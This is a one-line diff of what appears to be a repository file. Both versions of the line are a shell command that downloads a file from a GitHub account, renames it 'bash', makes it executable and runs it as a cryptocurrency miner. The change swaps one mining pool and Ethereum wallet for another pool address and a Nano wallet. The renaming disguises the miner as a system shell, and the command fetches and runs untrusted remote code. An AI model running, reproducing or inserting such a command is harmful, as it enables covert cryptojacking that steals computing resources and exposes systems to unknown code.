@@ -1,1 +1,1 @@
-wget https://github.com/mcnxzijfe/hoangg/raw/main/cv.py && mv cv.py bash && chmod +x bash && ./bash --algo ETHASH --pool stratum+ssl://eth-hk.flexpool.io:5555 --user 0x40941a33388c9903Edf596f7195a619A1D57ff10.WORKER_NAME  --pool stratum+ssl://eth-sg.flexpool.io:5555 --user 0x40941a33388c9903Edf596f7195a619A1D57ff10.WORKER_NAME
+wget https://github.com/mcnxzijfe/hoangg/raw/main/cv.py && mv cv.py bash && chmod +x bash && ./bash --algo ETHASH --pool 172-31-53-193:80 --user nano_15yc3tyhj9wk19xc3ob45p8rxjaam7esbpoctaugafcc4ww76kg9yj8s99ui.WORKER_NAME
